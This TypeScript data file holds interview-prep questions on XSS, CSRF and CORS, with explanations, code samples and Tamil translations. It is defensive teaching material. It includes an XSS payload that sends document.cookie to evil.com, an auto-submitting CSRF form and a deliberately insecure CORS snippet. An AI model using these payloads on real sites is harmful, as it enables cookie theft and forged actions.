import type { IQuestion } from '@/types';

import { createQuestion } from '@/lib/questions/create-question';

export const securityQuestionsSet1: IQuestion[] = [
    createQuestion({
        id: 'sc-1',
        topicId: 'security',
        title: 'What is XSS?',
        difficulty: 'Advanced',
        status: 'in-progress',
        priority: 'medium',
        simpleExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'XSS (Cross-Site Scripting) is when an attacker gets their JavaScript to run inside your website.',
                            'It happens when the site shows untrusted input without cleaning it.',
                            'The script can steal data, act as the user or change the page.',
                            'It is one of the most common web security problems.',
                        ],
                    },
                ],
            },
        ],
        seniorExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            "XSS lets an attacker run **script in the victim's browser under your site's origin**, so it bypasses the Same-Origin Policy.",
                            '**Stored XSS** - malicious input saved on the server (comments, profiles) and shown to other users.',
                            '**Reflected XSS** - payload in the request (URL/query) is reflected in the response immediately.',
                            '**DOM-based XSS** - client-side JS writes untrusted data into the DOM unsafely (innerHTML, document.write, eval, location).',
                            '**Impact** - read non-HttpOnly cookies/tokens and localStorage, perform actions as the user, keylogging, phishing overlays, crypto mining, defacement.',
                            '**Root cause** - untrusted data treated as code/HTML without proper context-aware encoding.',
                            '**Sinks to watch** - innerHTML, outerHTML, dangerouslySetInnerHTML, v-html, document.write, eval/new Function, href/src with javascript: URLs, unsafe template rendering.',
                            '**Frameworks help** - React, Angular and Vue escape output by default, but escape hatches and third-party content reintroduce risk.',
                        ],
                    },
                ],
            },
        ],
        simpleExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'code',
                        text: `// Vulnerable: untrusted input becomes HTML
    const name = new URLSearchParams(location.search).get('name');
    document.getElementById('welcome').innerHTML = 'Hello ' + name;
    // ?name=<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
    
    // Safe: treat input as text
    document.getElementById('welcome').textContent = 'Hello ' + name;
    
    // React: escaped by default
    <p>Hello {name}</p>
    // Dangerous escape hatch
    <div dangerouslySetInnerHTML={{ __html: userHtml }} />`,
                    },
                    {
                        type: 'highlight',
                        text: 'innerHTML executes injected markup, while textContent and React text rendering treat input as plain text.',
                    },
                ],
            },
        ],
        realProjectExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'paragraph',
                        text: 'In Archer Review, user-entered content such as names and notes was rendered as text through React, and any rich content was sanitized before being displayed.',
                    },
                ],
            },
        ],
        interviewAnswer: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            "XSS is when untrusted input is rendered as executable script in the victim's browser, so the attacker runs code with my site's privileges.",
                            'There are stored, reflected and DOM-based types.',
                            'Impact includes stealing tokens, performing actions as the user and defacement.',
                            'I prevent it with output encoding, avoiding unsafe sinks, sanitization, CSP and HttpOnly cookies.',
                        ],
                    },
                ],
            },
        ],
        interviewAnswerTamil: [
            {
                label: '1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Simple Explanation**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'XSS (Cross-Site Scripting) என்பது ஒரு தாக்குதல் செய்பவர் (Attacker), உங்களுடைய website-க்குள் அவருடைய JavaScript code-ஐ இயக்க வைப்பதாகும்.',
                            'Website-ல் நம்பகமற்ற தகவல்களை (Untrusted Input) சரியாகச் சரிபார்க்காமல் அல்லது பாதுகாப்பாக மாற்றாமல் காட்டும்போது XSS தாக்குதல் ஏற்படலாம்.',
                            'இந்த JavaScript code மூலம் பயனருடைய தகவல்களைத் திருடலாம், பயனரைப் போலவே செயல்படலாம் அல்லது website-ன் பக்கத்தை மாற்றலாம்.',
                            'XSS என்பது இணையதளங்களில் ஏற்படக்கூடிய பொதுவான பாதுகாப்புப் பிரச்சினைகளில் (Web Security Problems) ஒன்றாகும்.',
                        ],
                    },
                ],
            },
            {
                label: '2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Interview Answer**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'XSS என்பது நம்பகமற்ற தகவல்களை (Untrusted Input) சரியாகப் பாதுகாக்காமல் website-ல் காட்டும்போது, அது பயனரின் browser-ல் JavaScript code-ஆக இயங்குவதைக் குறிக்கும். இதனால், தாக்குதல் செய்பவர் (Attacker) நம்முடைய website-ன் அனுமதிகளைப் பயன்படுத்தி செயல்பட முடியும்.',
                        ],
                    },
                    {
                        type: 'heading',
                        text: 'XSS-ல் மூன்று வகைகள் உள்ளன:',
                    },
                    {
                        type: 'bullets',
                        items: [
                            '**Stored XSS** – தீங்கிழைக்கும் (Harmful) code website-ன் database-ல் சேமிக்கப்படும்.',
                            '**Reflected XSS** – தீங்கிழைக்கும் (Harmful) input, server response மூலம் உடனடியாகத் திருப்பிக் காட்டப்படும்.',
                            '**DOM-based XSS** – browser-ல் JavaScript இயங்கும்போது DOM-ஐ தவறாகக் கையாளுவதால் ஏற்படும்.',
                        ],
                    },
                    {
                        type: 'paragraph',
                        text: '**இதனால் ஏற்படும் பாதிப்புகள்**: பயனரின் tokens-ஐத் திருடுவது, பயனரைப் போலச் செயல்படுவது, website-ன் உள்ளடக்கத்தை மாற்றுவது போன்றவை.',
                    },
                    {
                        type: 'heading',
                        text: 'XSS-ஐத் தடுக்கும் வழிகள்:',
                    },
                    {
                        type: 'bullets',
                        items: [
                            '**Output Encoding** – பயனர் கொடுக்கும் தகவல்களை code-ஆக இயங்காமல், சாதாரண text-ஆகக் காட்டுவது.',
                            '**Avoiding Unsafe Sinks** – innerHTML போன்ற பாதுகாப்பற்ற முறைகளைத் தவிர்த்து, textContent போன்ற பாதுகாப்பான முறைகளைப் பயன்படுத்துவது.',
                            '**Sanitization** – அனுமதிக்கப்படாத அல்லது ஆபத்தான HTML-ஐ நீக்குவது.',
                            '**CSP (Content Security Policy)** – எந்த scripts இயங்கலாம் என்பதைக் கட்டுப்படுத்துவது.',
                            '**HttpOnly Cookies** – JavaScript மூலம் cookies-ஐ நேரடியாகப் படிப்பதைத் தடுப்பது.',
                        ],
                    },
                ],
            },
        ],
        scenarioQuestions: [
            {
                label: 'Scenario 1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Your app has a comments feature that displays user HTML. How do you make it safe?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Prefer plain text or Markdown rendered through a safe pipeline.',
                            'If HTML is required, sanitize with DOMPurify using an allowlist before rendering.',
                            'Add CSP as a second layer of defense.',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**A security scan reports reflected XSS on a search page. Where do you look?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Find where the query parameter is written into HTML/JS without encoding.',
                            'Use context-aware encoding or framework escaping, validate input, and add CSP.',
                        ],
                    },
                ],
            },
        ],
        speakingPractice: [
            {
                label: '',
                blocks: [
                    {
                        type: 'keywords',
                        items: [
                            'XSS',
                            'Stored/Reflected/DOM',
                            'innerHTML',
                            'Output encoding',
                            'Same-Origin Policy',
                            'Sanitization',
                        ],
                    },
                ],
            },
        ],
    }),

    createQuestion({
        id: 'sc-2',
        topicId: 'security',
        title: 'How do you prevent XSS?',
        difficulty: 'Advanced',
        status: 'in-progress',
        priority: 'medium',
        simpleExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'Never insert user input directly as HTML.',
                            'Use frameworks that escape output, like React.',
                            'Sanitize HTML if you must allow it.',
                            'Add a Content Security Policy and use HttpOnly cookies.',
                        ],
                    },
                ],
            },
        ],
        seniorExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'Use **defense in depth**: encode output, avoid dangerous sinks, sanitize, restrict script execution and limit damage.',
                            '**Output encoding** - encode by context (HTML, attribute, JavaScript, URL, CSS). Use framework default escaping.',
                            '**Avoid sinks** - textContent instead of innerHTML, no eval/new Function, no document.write, careful with dangerouslySetInnerHTML.',
                            '**Sanitize HTML** - when HTML is required, use DOMPurify (allowlist tags/attributes) on the client or a trusted server library; sanitize at render time too.',
                            '**Validate URLs** - allow only http, https and mailto for user-provided links; block javascript: and data: URLs.',
                            '**CSP** - strict policy with nonces/hashes, no unsafe-inline; Trusted Types to lock down DOM sinks.',
                            '**Cookies** - HttpOnly, Secure, SameSite so scripts cannot read session cookies.',
                            '**Input validation** - helpful but not sufficient; encode on output.',
                            '**Dependencies and third-party scripts** - keep updated, use Subresource Integrity, minimize third-party tags.',
                            '**Testing** - automated scanners, code review for risky sinks, ESLint security rules.',
                        ],
                    },
                ],
            },
        ],
        simpleExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'code',
                        text: `import DOMPurify from 'dompurify';
    
    // Sanitize rich HTML before rendering
    const clean = DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
    });
    <div dangerouslySetInnerHTML={{ __html: clean }} />
    
    // Validate user-provided links
    function safeUrl(url) {
    try {
    const u = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:'].includes(u.protocol) ? u.href : '#';
    } catch { return '#'; }
    }
    <a href={safeUrl(profile.website)} rel="noopener noreferrer">Website</a>`,
                    },
                    {
                        type: 'highlight',
                        text: 'Sanitization uses an allowlist, and URL validation blocks javascript: links.',
                    },
                ],
            },
        ],
        realProjectExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'paragraph',
                        text: 'In Archer Review, we avoided raw HTML, sanitized the few rich-text areas with DOMPurify and added CSP headers as an extra layer.',
                    },
                ],
            },
        ],
        interviewAnswer: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'I rely on framework escaping and avoid dangerous sinks like innerHTML and eval.',
                            'When HTML is needed I sanitize with DOMPurify using an allowlist, and I validate URL protocols.',
                            'I add a strict CSP with nonces, Trusted Types where possible, and HttpOnly Secure SameSite cookies.',
                            'Input validation helps but output encoding is the main control.',
                        ],
                    },
                ],
            },
        ],
        interviewAnswerTamil: [
            {
                label: '1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Simple Explanation**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'பயனர் கொடுக்கும் தகவல்களை நேரடியாக HTML-ஆகச் சேர்க்கக் கூடாது. (Never insert user input directly as HTML.)',
                            'React போன்ற output-ஐத் தானாகவே பாதுகாப்பாகக் காட்டும் frameworks-ஐப் பயன்படுத்த வேண்டும். (Use frameworks that escape output, like React.)',
                            'HTML-ஐ அனுமதிக்க வேண்டிய சூழலில், அதைச் சரியாகச் சுத்தப்படுத்த வேண்டும். (Sanitize HTML if you must allow it.)',
                            'Content Security Policy (CSP)-ஐ அமைத்து, HttpOnly cookies-ஐப் பயன்படுத்த வேண்டும். (Add a Content Security Policy and use HttpOnly cookies.)',
                        ],
                    },
                ],
            },
        ],
        scenarioQuestions: [
            {
                label: 'Scenario 1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Product wants users to paste rich text into a CMS field. How do you handle it safely?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Store sanitized HTML (allowlist) or use a structured format like Markdown/JSON blocks.',
                            'Sanitize again when rendering and apply CSP.',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**A user-provided profile link is rendered as <a href={url}>. Is that safe?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'No: javascript: URLs can execute script.',
                            'Validate the protocol with URL() and allow only http/https/mailto, and add rel="noopener noreferrer".',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 3',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**A third-party analytics script gets compromised. How do you reduce the damage?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Use CSP to limit what origins can run/connect, and Subresource Integrity for static scripts.',
                            'Load third parties in sandboxed iframes or minimize them.',
                        ],
                    },
                ],
            },
        ],
        speakingPractice: [
            {
                label: '',
                blocks: [
                    {
                        type: 'keywords',
                        items: ['Output encoding', 'DOMPurify', 'CSP', 'Trusted Types', 'HttpOnly', 'Allowlist'],
                    },
                ],
            },
        ],
    }),

    createQuestion({
        id: 'sc-3',
        topicId: 'security',
        title: 'What is CSRF?',
        difficulty: 'Advanced',
        status: 'in-progress',
        priority: 'medium',
        simpleExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            "CSRF (Cross-Site Request Forgery) tricks a logged-in user's browser into sending a request they did not intend.",
                            'It works because browsers automatically send cookies to the site.',
                            'Example: a hidden form on a bad site transfers money from your bank account.',
                            'The attacker cannot read the response, but the action still happens.',
                        ],
                    },
                ],
            },
        ],
        seniorExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CSRF abuses the fact that browsers **automatically attach cookies** (session credentials) to requests to a site, even when the request was initiated from another site.',
                            '**Attack flow** - user is logged in to bank.com; visits evil.com which auto-submits a form or fires a request to bank.com/transfer; the browser includes bank.com cookies; the server thinks it is the user.',
                            '**Targets** - state-changing requests (POST/PUT/DELETE, and GET if misused for actions): change email/password, transfer, delete.',
                            '**Not affected** - APIs that authenticate with a header token that browsers do not attach automatically (Authorization: Bearer from JS), though XSS then becomes the bigger risk.',
                            "**Impact** - unauthorized actions performed with the user's privileges.",
                            '**Different from XSS** - CSRF does not run code on your site; it makes the browser send a forged request. XSS can also defeat CSRF tokens.',
                            '**Why SOP does not stop it** - SOP blocks reading responses cross-origin, but does not block sending requests.',
                        ],
                    },
                ],
            },
        ],
        simpleExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'code',
                        text: `<!-- On evil.com: auto-submitting hidden form -->
    <form action="https://bank.example.com/transfer" method="POST" id="f">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
    </form>
    <script>document.getElementById('f').submit();</script>
    
    <!-- Dangerous API design: state change via GET -->
    <img src="https://bank.example.com/delete-account?id=42">`,
                    },
                    {
                        type: 'highlight',
                        text: "The browser sends the victim's cookies automatically, so the server cannot tell the request was forged.",
                    },
                ],
            },
        ],
        realProjectExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'paragraph',
                        text: 'In Archer Review, session cookies used SameSite and state-changing endpoints required POST with CSRF protection, so forged cross-site requests were rejected.',
                    },
                ],
            },
        ],
        interviewAnswer: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            "CSRF tricks a logged-in user's browser into sending an unwanted request, because cookies are attached automatically.",
                            'It targets state-changing actions and the attacker cannot read the response.',
                            'It is different from XSS because it does not run code in my site.',
                            'I protect with SameSite cookies, CSRF tokens, Origin checks and no state changes via GET.',
                        ],
                    },
                ],
            },
        ],
        interviewAnswerTamil: [
            {
                label: '1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Simple Explanation**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            '**CSRF (Cross-Site Request Forgery)** என்பது ஒரு பயனர் ஏற்கனவே website-ல் Login செய்திருக்கும்போது, அவருக்குத் தெரியாமலேயே அவர் செய்ய விரும்பாத ஒரு request-ஐ அவருடைய browser மூலம் அனுப்ப வைப்பதாகும்.',
                            '**இது எப்படி வேலை செய்கிறது?** Browser தானாகவே அந்த website-க்கான cookies-ஐ request-உடன் அனுப்புவதால் இந்தத் தாக்குதல் நடக்கலாம்.',
                            '**உதாரணம்:** நீங்கள் உங்கள் வங்கிக் கணக்கில் Login செய்திருக்கிறீர்கள் என்று வைத்துக்கொள்வோம். நீங்கள் ஒரு தீங்கிழைக்கும் website-ஐத் திறக்கும்போது, அதில் மறைத்து வைக்கப்பட்டுள்ள form மூலம் உங்கள் வங்கிக் கணக்கிலிருந்து பணம் அனுப்புவதற்கான request அனுப்பப்படலாம்.',
                            '**முக்கியமான விஷயம்:** தாக்குதல் செய்பவரால் அந்த request-ன் response-ஐப் படிக்க முடியாமல் இருக்கலாம். ஆனால், அந்த request வெற்றிகரமாகச் செயல்படுத்தப்பட்டால், பணம் அனுப்புவது போன்ற செயல் நடந்துவிடலாம்.',
                        ],
                    },
                ],
            },
            {
                label: '2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Interviewer Answer**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'CSRF (Cross-Site Request Forgery) என்பது ஒரு பயனர் ஏற்கனவே website-ல் Login செய்திருக்கும்போது, அவருக்குத் தெரியாமல் அவருடைய browser மூலம் தேவையில்லாத request-ஐ அனுப்ப வைக்கும் தாக்குதலாகும். ஏனென்றால், browser தானாகவே cookies-ஐ request-உடன் சேர்த்து அனுப்பும்.',
                            'இது எந்தச் செயல்களைப் பாதிக்கும்? பணம் அனுப்புவது, password மாற்றுவது அல்லது account விவரங்களை மாற்றுவது போன்ற முக்கியமான செயல்களைப் பாதிக்கலாம். தாக்குதல் செய்பவரால் அந்த request-ன் response-ஐப் படிக்க முடியாமல் இருக்கலாம். ஆனால், அந்தச் செயல் நடந்துவிடலாம்.',
                            'CSRF மற்றும் XSS இடையிலான வேறுபாடு: XSS-ல் தாக்குதல் செய்பவரின் JavaScript code நம்முடைய website-ல் இயங்கும். ஆனால் CSRF-ல் நம்முடைய website-ல் code-ஐ இயக்க வேண்டிய அவசியமில்லை; பயனரின் browser மூலம் request அனுப்பப்படுகிறது.',
                        ],
                    },
                    {
                        type: 'heading',
                        text: 'CSRF-ஐத் தடுக்கும் வழிகள்:',
                    },
                    {
                        type: 'bullets',
                        items: [
                            '**SameSite Cookies** – வேறு website-களிலிருந்து வரும் request-களில் cookies அனுப்பப்படுவதைக் கட்டுப்படுத்த உதவும்.',
                            '**CSRF Tokens** – ஒவ்வொரு முக்கியமான request-க்கும் சரியான token இருக்கிறதா என்று சரிபார்க்கும்.',
                            '**Origin Checks** – request நம்பகமான website-லிருந்து வருகிறதா என்று சரிபார்க்கும்.',
                            '**GET மூலம் State Change செய்யக்கூடாது** – GET request-ஐப் பயன்படுத்தி பணம் அனுப்புவது, password மாற்றுவது போன்ற முக்கியமான செயல்களைச் செய்ய அனுமதிக்கக் கூடாது.',
                        ],
                    },
                ],
            },
        ],
        scenarioQuestions: [
            {
                label: 'Scenario 1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**A teammate implemented "delete item" as GET /delete?id=5. What is the risk?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'An attacker can trigger it with an img tag or link while the victim is logged in (CSRF).',
                            'Use POST/DELETE with CSRF protection; GET must be safe and idempotent.',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Your API uses Bearer tokens in the Authorization header from JavaScript. Do you need CSRF protection?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Not for the header-based auth, since browsers do not auto-attach it.',
                            'But protect against XSS because the token is accessible to scripts, and keep CSRF protection for any cookie-based endpoints.',
                        ],
                    },
                ],
            },
        ],
        speakingPractice: [
            {
                label: '',
                blocks: [
                    {
                        type: 'keywords',
                        items: ['CSRF', 'Cookies', 'State-changing requests', 'SameSite', 'Forged request', 'Session'],
                    },
                ],
            },
        ],
    }),

    createQuestion({
        id: 'sc-4',
        topicId: 'security',
        title: 'How does CSRF protection work?',
        difficulty: 'Advanced',
        status: 'in-progress',
        priority: 'medium',
        simpleExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'The server makes sure the request really came from your own site.',
                            'Common way: send a secret CSRF token with each form or request and check it on the server.',
                            'SameSite cookies stop browsers from sending cookies on most cross-site requests.',
                            'The server can also check the Origin header.',
                        ],
                    },
                ],
            },
        ],
        seniorExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CSRF defenses make sure a state-changing request **proves it came from your app**, using something an attacker cannot forge or read.',
                            '**SameSite cookies** - Lax (default in modern browsers) blocks cookies on cross-site POST/subresource requests; Strict blocks on all cross-site navigations; None requires Secure. Good baseline, not the only layer.',
                            '**CSRF tokens (synchronizer)** - random per-session/request token stored on the server, embedded in forms or sent in a custom header, validated on each unsafe request.',
                            '**Double-submit cookie** - token in a cookie and in the request header/body; server compares them (prefer signed tokens).',
                            '**Origin/Referer verification** - reject unsafe requests whose Origin does not match the allowed origin(s).',
                            '**Custom headers / content-type** - requiring e.g. X-Requested-With or application/json forces a CORS preflight for cross-site requests.',
                            '**Safe methods** - never change state with GET.',
                            '**Re-authentication/step-up** for sensitive actions (password change, payments).',
                            '**Frameworks** - many provide it (Django, Rails, Spring Security, Auth.js). Next.js Server Actions only accept POST and compare Origin with Host (configurable allowedOrigins), but Route Handlers need their own protection.',
                            'Combine SameSite + token/Origin checks + secure CORS.',
                        ],
                    },
                ],
            },
        ],
        simpleExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'code',
                        text: `// Express + cookie session
    res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'lax' });
    
    // Verify Origin on unsafe requests
    app.use((req, res, next) => {
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
    const origin = req.get('Origin');
    if (!origin || !ALLOWED_ORIGINS.includes(origin)) return res.status(403).send('Bad origin');
    }
    next();
    });
    
    // CSRF token in a custom header
    fetch('/api/profile', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
    body: JSON.stringify(data),
    });`,
                    },
                    {
                        type: 'highlight',
                        text: 'SameSite limits cookie sending, the Origin check rejects foreign sites, and the token proves the request came from the app.',
                    },
                ],
            },
        ],
        realProjectExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'paragraph',
                        text: 'In Archer Review, we combined SameSite=Lax session cookies, Origin validation and anti-CSRF tokens on non-Server-Action endpoints.',
                    },
                ],
            },
        ],
        interviewAnswer: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CSRF protection makes unsafe requests prove they come from my app.',
                            'I use SameSite cookies as a baseline, CSRF tokens (synchronizer or signed double-submit), and Origin/Referer checks.',
                            'I never change state with GET and require re-authentication for sensitive operations.',
                            'In Next.js Server Actions have an Origin check, but Route Handlers need explicit protection.',
                        ],
                    },
                ],
            },
        ],
        scenarioQuestions: [
            {
                label: 'Scenario 1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Product needs your API to be called from a partner site with cookies. How do you stay safe?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Avoid cookie-based cross-site auth if possible; use OAuth tokens/API keys instead.',
                            'If needed: SameSite=None; Secure, strict origin allowlist with CORS, CSRF tokens and short sessions.',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Why is SameSite=Lax alone not enough?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Older browsers/edge cases, same-site attacks from subdomains, and top-level GET navigations are still allowed.',
                            'Add tokens/Origin checks for defense in depth.',
                        ],
                    },
                ],
            },
        ],
        speakingPractice: [
            {
                label: '',
                blocks: [
                    {
                        type: 'keywords',
                        items: [
                            'SameSite',
                            'CSRF token',
                            'Double-submit cookie',
                            'Origin check',
                            'Preflight',
                            'Idempotent GET',
                        ],
                    },
                ],
            },
        ],
    }),

    createQuestion({
        id: 'sc-5',
        topicId: 'security',
        title: 'What is CORS?',
        difficulty: 'Advanced',
        status: 'in-progress',
        priority: 'medium',
        simpleExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CORS means Cross-Origin Resource Sharing.',
                            'It is a browser rule that decides if one website can read responses from another website.',
                            'The server allows it using headers like Access-Control-Allow-Origin.',
                            'It protects users, but it does not protect your server from other clients.',
                        ],
                    },
                ],
            },
        ],
        seniorExplanation: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CORS is an HTTP-header mechanism that lets a server **opt in to cross-origin reads**, relaxing the Same-Origin Policy for specific origins.',
                            "**Enforced by browsers only** - curl, Postman and servers ignore it; it protects users' browsers, not your API from direct calls.",
                            '**Simple requests** - sent directly; browser checks the response headers before exposing it to JavaScript.',
                            '**Preflight** - for non-simple requests (custom headers like Authorization, JSON content type, PUT/DELETE) the browser sends OPTIONS first and checks Allow-Methods/Allow-Headers.',
                            '**Credentials** - cookies are sent only with credentials: "include" and Access-Control-Allow-Credentials: true; then Allow-Origin cannot be "*".',
                            '**Security risks of misconfiguration** - reflecting any Origin with credentials enabled, allowing "null" origin, trusting broad regex/subdomain matches; this lets attacker sites read authenticated responses.',
                            '**Best practice** - strict allowlist of origins, minimal methods and headers, Vary: Origin when responding dynamically, cache preflight with Max-Age.',
                            'Authentication and authorization must still be enforced on the server.',
                        ],
                    },
                ],
            },
        ],
        simpleExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'code',
                        text: `// Insecure: reflects any origin with credentials
    app.use((req, res, next) => {
    res.set('Access-Control-Allow-Origin', req.get('Origin'));   // BAD
    res.set('Access-Control-Allow-Credentials', 'true');
    next();
    });
    
    // Secure: allowlist
    const ALLOWED = ['https://app.example.com', 'https://admin.example.com'];
    app.use(cors({
    origin: (origin, cb) => (!origin || ALLOWED.includes(origin)) ? cb(null, true) : cb(new Error('Not allowed')),
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    maxAge: 600,
    }));`,
                    },
                    {
                        type: 'highlight',
                        text: 'Reflecting any origin with credentials lets attacker sites read user data; an allowlist avoids that.',
                    },
                ],
            },
        ],
        realProjectExample: [
            {
                label: '',
                blocks: [
                    {
                        type: 'paragraph',
                        text: 'In Archer Review, the API allowed only the known front-end origins with credentials and cached preflight responses, instead of using a wildcard.',
                    },
                ],
            },
        ],
        interviewAnswer: [
            {
                label: '',
                blocks: [
                    {
                        type: 'bullets',
                        items: [
                            'CORS is a browser mechanism where the server uses headers to allow specific origins to read its responses.',
                            'It relaxes the Same-Origin Policy, is enforced only by browsers, and non-simple requests use an OPTIONS preflight.',
                            'A dangerous misconfiguration is reflecting any origin with credentials enabled.',
                            'I use a strict allowlist and still enforce authentication on the server.',
                        ],
                    },
                ],
            },
        ],
        scenarioQuestions: [
            {
                label: 'Scenario 1',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**Security review flags "Access-Control-Allow-Origin: * with Allow-Credentials: true". What is wrong?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'Browsers reject that combination, and it signals a dangerous config (or a workaround that reflects any origin).',
                            'Use an explicit allowlist and return the matching origin with Vary: Origin.',
                        ],
                    },
                ],
            },
            {
                label: 'Scenario 2',
                blocks: [
                    {
                        type: 'paragraph',
                        text: '**A developer "fixes" CORS by disabling web security in Chrome. What do you say?**',
                    },
                    {
                        type: 'bullets',
                        items: [
                            'That only hides the problem on their machine; users will still be blocked.',
                            'Fix it on the server/proxy with correct CORS headers.',
                        ],
                    },
                ],
            },
        ],
        speakingPractice: [
            {
                label: '',
                blocks: [
                    {
                        type: 'keywords',
                        items: ['CORS', 'Preflight', 'Allowlist', 'Credentials', 'Vary: Origin', 'Misconfiguration'],
                    },
                ],
            },
        ],
    }),
];
